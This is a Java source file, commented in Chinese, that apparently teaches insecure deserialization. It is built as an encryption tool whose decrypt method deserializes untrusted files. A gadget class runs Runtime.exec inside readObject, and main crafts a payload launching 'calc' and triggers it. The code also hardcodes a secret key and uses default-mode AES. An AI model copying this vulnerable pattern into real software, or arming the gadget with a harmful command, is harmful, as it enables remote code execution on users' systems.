import java.io.*;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.security.*;
import java.util.Base64;

/**
 * 文件加密解密工具（存在不安全的反序列化漏洞）
 * 设计思路：在解密过程中反序列化不可信数据
 */
public class FileEncryptor {
    // 模拟敏感数据容器（可序列化）
    public static class EncryptedData implements Serializable {
        private static final long serialVersionUID = 1L;
        byte[] encryptedData;
        String algorithm;
        
        public EncryptedData(byte[] encryptedData, String algorithm) {
            this.encryptedData = encryptedData;
            this.algorithm = algorithm;
        }
    }

    // 模拟恶意类（攻击者构造的gadget）
    public static class MaliciousPayload implements Serializable {
        private String command;
        public MaliciousPayload(String command) {
            this.command = command;
        }
        private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            // 模拟实际漏洞中的代码执行
            Runtime.getRuntime().exec(command);
        }
    }

    // 不安全的解密方法（存在漏洞）
    public static String decrypt(String filePath, String keyStr) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath))) {
            // 危险操作：直接反序列化不可信数据
            EncryptedData data = (EncryptedData) ois.readObject();
            
            // 模拟实际解密流程
            Cipher cipher = Cipher.getInstance(data.algorithm);
            SecretKey key = new SecretKeySpec(keyStr.getBytes(), "AES");
            cipher.init(Cipher.DECRYPT_MODE, key);
            return new String(cipher.doFinal(data.encryptedData));
        }
    }

    // 安全加密方法（防御式编程）
    public static void encrypt(String data, String keyStr, String filePath) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        SecretKey key = new SecretKeySpec(keyStr.getBytes(), "AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath))) {
            oos.writeObject(new EncryptedData(cipher.doFinal(data.getBytes()), "AES"));
        }
    }

    // 漏洞利用示例
    public static void main(String[] args) throws Exception {
        // 正常使用示例
        String key = "ThisIsASecretKey";
        String filePath = "encrypted.dat";
        
        // 正常加密
        encrypt("Hello, World!", key, filePath);
        
        // 正常解密
        System.out.println("正常解密结果: " + decrypt(filePath, key));
        
        // 构造恶意文件（模拟攻击）
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath))) {
            oos.writeObject(new MaliciousPayload("calc")); // Windows计算器
        }
        
        // 触发漏洞（实际使用时会执行命令）
        System.out.println("触发恶意解密...");
        decrypt(filePath, key); // 这里会执行Runtime.exec("calc")
    }
}